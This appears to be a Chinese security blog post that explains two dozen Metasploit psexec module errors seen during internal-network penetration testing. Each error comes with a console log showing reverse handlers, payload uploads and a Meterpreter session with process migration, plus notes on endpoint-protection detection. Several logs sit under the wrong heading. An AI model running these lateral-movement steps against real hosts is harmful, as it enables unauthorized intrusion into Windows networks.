\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/yoj5mBIk4p0aWU06Z3c9wQ)
| 

**声明：**该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。

请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。

**所有话题标签：**

[#Web 安全](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1558250808926912513&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#漏洞复现](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1558250808859803651&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#工具使用](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1556485811410419713&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#权限提升](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559100355605544960&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)

[#权限维持](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1554692262662619137&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#防护绕过](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1553424967114014720&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#内网安全](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559102220258885633&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#实战案例](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1553386251775492098&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)

[#其他笔记](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559102973052567553&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#资源分享](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559103254909796352&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect) [](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559103254909796352&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect) [#MSF](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1570778197200322561&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)

 |

我们做内网渗透时经常会用到 Metasploit 的 Psexec 模块，但也时常遇到利用失败的情况，而且每次报错信息都还不一样。如果我们能够了解这些报错的具体产生原因，这将有利于我们快速找到解决办法或其它替代方案，但有时也会因为 MSF 版本不同而出现的报错信息不太一样。

当时在本地复现时忘了截图，也懒得再去操作一次了，大家先将就着看一下吧，等啥时候有时间了再补上。在实战测试中如果遇到报错时只需过来搜索一下就大概知道什么是原因了！！！

### (1) Rex::AddressInUse The address is already in use

报错原因：监听端口被占用。

```
msf exploit(windows/smb/psexec) > exploit

\[-\] Handler failed to bind to 192.168.1.108:4444
\[-\] Handler failed to bind to 0.0.0.0:4444
\[-\] Exploit failed: Rex::AddressInUse The address is already in use (0.0.0.0:4444).
```

### (2) Rex::ConnectionTimeout The connection timed out

报错原因：目标主机开启系统防火墙并阻止了 445 端口的连接。

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[-\] Exploit failed \[unreachable\]: Rex::ConnectionTimeout The connection timed out (192.168.1.108:445).
```

### (3) Rex::HostUnreachable The host was unreachable

报错原因：目标主机无法访问，可能处于关机状态或者没有连接到网络。

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[-\] Exploit failed \[unreachable\]: Rex::HostUnreachable The host (192.168.1.108:445) was unreachable.
```

### (4) Rex::ConnectionRefused The connection was refused by the remote host

报错原因：目标主机 445 端口处于关闭状态或者 Server 服务处于停止状态。

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[-\] Exploit failed \[unreachable\]: Rex::ConnectionRefused The connection was refused by the remote host (192.168.1.108:445).
```

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.108:445|WORKGROUP as user '90sec'...
\[-\] Exploit failed \[no-access\]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: execution expired
```

### (5) Rex::Proto::SMB::Exceptions::LoginError Login Failed: execution expired

报错原因：验证过程中发生错误，如果目标主机在使用域中的帐户执行 MSF Psexec 时无法访问 DC 计算机，则会收到此错误。

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.108:445 as user 'administrator'...
\[-\] Exploit failed \[no-access\]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS\_LOGON\_FAILURE (Command=115 WordCount=0)
```

‍

### (6) Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS\_LOGON\_FAILURE

报错原因：目标主机管理员账户或密码不正确。

```
msf5 exploit(windows/smb/psexec) > exploit 

\[\*\] Started reverse TCP handler on 192.168.1.120:4444 
\[\*\] 192.168.1.108:445 - Connecting to the server...
\[\*\] 192.168.1.108:445 - Authenticating to 192.168.1.108:445| as user 'administrator'...
\[-\] 192.168.1.108:445 - Exploit failed: RubySMB::Error::UnexpectedStatusCode STATUS\_USER\_SESSION\_DELETED
```

RubySMB::Error::UnexpectedStatusCode STATUS\_USER\_SESSION\_DELETED

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.108:445|WORKGROUP as user '90sec'...
\[-\] Exploit failed \[no-access\]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS\_NETLOGON\_NOT\_STARTED (Command=115 WordCount=0)
```

### (7) Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS\_NETLOGON\_NOT\_STARTED

报错原因：Netlogon 或 Workstation 服务已禁用。

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.108:445 as user 'administrator'...
\[-\] Exploit failed \[no-access\]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS\_ACCOUNT\_DISABLED (Command=115 WordCount=0)
```

### (8) Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS\_ACCOUNT\_DISABLED

报错原因：目标主机上的 administrator 管理员账户被禁用。

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:443 
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.108:445 as user 'administrator'...
\[-\] Exploit failed \[no-access\]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS\_PASSWORD\_MUST\_CHANGE (Command=115 WordCount=0)
```

### (9) Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS\_PASSWORD\_MUST\_CHANGE

报错原因：用户下次登录时须更改密码，组策略 “密码最长使用期限” 默认为 42 天。

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.108:445|WORKGROUP as user 'administrator'...
\[-\] Exploit failed \[no-access\]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS\_ACCOUNT\_LOCKED\_OUT (Command=115 WordCount=0)
```

### (10) Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS\_ACCOUNT\_LOCKED\_OUT

报错原因：账户已被锁定，组策略 “账户锁定策略（帐户锁定阈值）” 默认为 0 永不锁定。

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.108:445 as user 'administrator'...
\[-\] Exploit failed \[no-access\]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: Connection reset by peer
```

### (11) Rex::Proto::SMB::Exceptions::LoginError Login Failed: Connection reset by peer

报错原因：目标主机上的 Server 服务处于停止状态，服务名称为：LanmanServer。

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.108:445 as user 'administrator'...
\[-\] Exploit failed \[no-access\]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS\_ACCOUNT\_RESTRICTION (Command=115 WordCount=0)
```

### (12) Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS\_ACCOUNT\_RESTRICTION

报错原因：目标主机上的 Administrator 密码为 “空”，而 psexec 模块中的 smbpass 选项是不能为 “空” 的，否则就会出现以下报错。组策略 “密码必须符合复杂性要求” 已禁用。

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.108:445 as user 'administrator'...
\[-\] Exploit failed \[no-access\]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS\_LOGON\_TYPE\_NOT\_GRANTED (Command=115 WordCount=0)
```

### (13) Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS\_LOGON\_TYPE\_NOT\_GRANTED

报错原因：Administrator 管理员的账户和密码都是正确的，但设置了组策略 “拒绝从网络访问此计算机” 选项就会出现以下报错。

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.108:445|WORKGROUP1 as user 'administrator'...
\[-\] Exploit failed \[no-access\]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS\_TRUSTED\_RELATIONSHIP\_FAILURE (Command=115 WordCount=0)
```

### (14) Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS\_TRUSTED\_RELATIONSHIP\_FAILURE (Command=115 WordCount=0)

报错原因：目标主机可能已脱离域，可能是 smbdomain 选项问题，这个问题暂时没有环境复现。

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.108:445 as user 'administrator'...
\[-\] Exploit failed: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS\_BAD\_NETWORK\_NAME (Command=117 WordCount=0)
```

### (15) Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS\_BAD\_NETWORK\_NAME

报错原因：指定了一个不存在的共享目录或 ADMIN$ 被删除时就会出现以下报错，因为 psexec 模块默认设置的是 ADMIN$，net share admin$ /delete。

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.108:445 as user '90sec'...
\[-\] Exploit failed \[no-access\]: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS\_ACCESS\_DENIED (Command=117 WordCount=0)
```

### (16) Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS\_ACCESS\_DENIED

报错原因：90sec 这个帐户可能不是本地管理员或启用了 Windows UAC 的帐户。

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.108:445|WORKGROUP as user 'administrator'...
\[\*\] Uploading payload...
\[-\] Exploit failed: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS\_OBJECT\_PATH\_SYNTAX\_BAD (Command=45 WordCount=0)
```

### (17) Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS\_OBJECT\_PATH\_SYNTAX\_BAD

报错原因：指定了错误的共享目录，例如 IPC$。

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.108:445|WORKGROUP as user 'administrator'...
\[\*\] 192.168.1.108:445 - Selecting native target
\[\*\] 192.168.1.108:445 - Uploading payload... PGREJDWE.exe
\[-\] 192.168.1.108:445 - Exploit failed: RubySMB::Error::UnexpectedStatusCode STATUS\_OBJECT\_NAME\_NOT\_FOUND
\[\*\] Exploit completed, but no session was created.
```

RubySMB::Error::UnexpectedStatusCode STATUS\_OBJECT\_NAME\_NOT\_FOUND

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.103:445|WORKGROUP as user '90sec'...
\[\*\] Uploading payload...
\[\*\] Created \\dwgbefJq.exe...
\[\*\] Deleting \\dwgbefJq.exe...
```

### (18) Hata Mesajı Yok

报错原因：由于重定向或其他原因，受害计算机与攻击者计算机之间没有连接。尽管相关共享（对于此示例为 ADMIN $，但对于其他无权访问 services.exe 的共享则更合乎逻辑）具有写入 / 读取权限，但如果该服务未经授权，也可能会收到此错误。

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.103:445|WORKGROUP as user 'administrator'...
\[\*\] Uploading payload...
\[\*\] Created \\quVtTqcy.exe...
\[\*\] Deleting \\quVtTqcy.exe...
\[-\] Exploit failed: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS\_OBJECT\_NAME\_NOT\_FOUND (Command=6 WordCount=0)
```

### (19) Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS\_OBJECT\_NAME\_NOT\_FOUND

报错原因：目标主机上有类似防病毒的系统，所以无法正常工作，与（17）的报错有点相似。

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.103:445|WORKGROUP as user '90sec'...
\[\*\] Uploading payload...
\[\*\] Created \\rcErXTSH.exe...
\[\*\] Deleting \\rcErXTSH.exe...
\[-\] Exploit failed: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS\_SHARING\_VIOLATION (Command=6 WordCount=0)
```

### (20) Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS\_SHARING\_VIOLATION

报错原因：目标主机上有类似防病毒的系统，文件可能已被隔离，所以无法正常工作。

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse TCP handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.109:445 as user 'administrator'...
\[\*\] Selecting PowerShell target
\[\*\] Executing the payload...
\[+\] Service start timed out, OK if running a command or non-service executable...
\[\*\] Sending stage (205891 bytes) to 192.168.1.109
\[\*\] Sending stage (205891 bytes) to 192.168.1.109
\[\*\] Sending stage (205891 bytes) to 192.168.1.109
\[\*\] Sending stage (205891 bytes) to 192.168.1.109
\[...SNIP...\]
```

### (21) Symantec Endpoint Protection

报错原因：能够正常工作，但是由于目标主机上运行着 Symantec Endpoint Protection 并开启着网络入侵防护功能（Network Intrusion Prevention），所以不能获取一个完整 Session，流量检测！

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse TCP handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.109:445 as user 'administrator'...
\[\*\] Selecting PowerShell target
\[\*\] Executing the payload...
\[+\] Service start timed out, OK if running a command or non-service executable...
\[\*\] Exploit completed, but no session was created.
```

### (22) System Center Endpoint Protection

报错原因：能够正常工作，但是由于目标主机上运行着 System Center Endpoint Protection 并开启着恶意行为检测功能，所以执行成功后也获取不到 Session。

```
msf exploit(windows/smb/psexec) > exploit 

\[\*\] Started reverse TCP handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.109:445 as user 'administrator'...
\[\*\] Selecting PowerShell target
\[\*\] Executing the payload...
\[+\] Service start timed out, OK if running a command or non-service executable...
\[\*\] Sending stage (205891 bytes) to 192.168.1.109
\[\*\] Meterpreter session 1 opened (192.168.1.120:4444 -> 192.168.1.109:49466) at 2018-05-15 06:04:39 +0800

meterpreter > 
\[\*\] Session ID 1 (192.168.1.120:4444 -> 192.168.1.109:49466) processing AutoRunScript 'post/windows/manage/migrate NAME=notepad.exe'
\[\*\] Running module against 123456
\[\*\] Current server process: powershell.exe (4364)
\[\*\] Spawning notepad.exe process to migrate to
\[+\] Migrating to 1192
\[+\] Successfully migrated to process 1192

\[\*\] 192.168.1.109 - Meterpreter session 1 closed.  Reason: Died
```

又或者得到 Session 后立马又给断开了，用进程迁移模块也一样被检测到了，行为检测！

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.103:445|WORKGROUP as user 'Guest'...

\[-\] FAILED! The remote host has only provided us with Guest privileges. Please make sure that the correct username and password have been provided. Windows XP systems that are not part of a domain will only provide Guest privileges to network logins by default.
```

### (23) The remote host has only provided us with Guest privileges. Please make sure that the correct username and password have been provided. Windows XP systems that are not part of a domain will only provide Guest privileges to network logins by default.

报错原因：失败！远程主机仅向我们提供访客权限。请确保提供了正确的用户名和密码。不属于域的 Windows XP 系统默认情况下仅为网络登录提供访客权限。

```
msf exploit(windows/smb/psexec) > exploit

\[\*\] Started reverse handler on 192.168.1.120:4444 
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.103:445|WORKGROUP as user '90sec'...
\[\*\] Uploading payload...
\[\*\] Created \\ilIfTitm.exe...
\[+\] 192.168.1.103:445 - Service started successfully...
\[\*\] Deleting \\ilIfTitm.exe...
\[-\] Exploit failed: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS\_CANNOT\_DELETE (Command=6 WordCount=0)
```

### (24) Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS\_CANNOT\_DELETE (Command=6 WordCount=0)

```
msf exploit(windows/smb/psexec) > exploit
\[\*\] Started reverse handler on 192.168.1.120:4444 
\[\*\] Connecting to the server...
\[\*\] Authenticating to 192.168.1.103:445|WORKGROUP as user '90sec'...
\[\*\] Uploading payload...
\[\*\] Created \\ilIfTitm.exe...
\[+\] 192.168.1.103:445 - Service started successfully...
\[\*\] Deleting \\ilIfTitm.exe...
\[-\] Exploit failed: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS\_CANNOT\_DELETE (Command=6 WordCount=0)
```

借这次知识星球的官方活动推下我的个人星球，里边没有干货文章，也没有各种 0day/Exp，只有自己的临时笔记和优质资源分享，考虑好后再决定是否加入！！！  

 **星球活动：**

1.  20 张 30 元 “潇湘信安” 优惠券，与知识星球官方活动一起 “食用” 更佳！（潇湘信安活动）
    
2.  新用户和续费用户均可享受手续费最高 10% 补贴，额度有限，先到先得！（知识星球活动）
    

 **活动时间：**2020 年 11 月 6 日 0 点 - 14 日 24 点（9 天）

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfqE3rrpOMO9arvGibmJOjnU5RM0vNic03SLkqb37ticH3NAiauaSluzpx882lAeHyiadzTWxglclPIATg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeicscsCKx326NxiaGHusgPNRgjicUHG1ssz8JfRYaI9HSKjVfEfibFkKzsJPZ4GCaiaymLRrmXjRqD8ag/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_gif/XOPdGZ2MYOeicscsCKx326NxiaGHusgPNRnK4cg8icPXAOUEccicNrVeu28btPBkFY7VwQzohkcqunVO9dXW5bh4uQ/640?wx_fmt=gif)  如果对你有所帮助，点个分享、赞、在看呗！![](https://mmbiz.qpic.cn/mmbiz_gif/XOPdGZ2MYOeicscsCKx326NxiaGHusgPNRnK4cg8icPXAOUEccicNrVeu28btPBkFY7VwQzohkcqunVO9dXW5bh4uQ/640?wx_fmt=gif)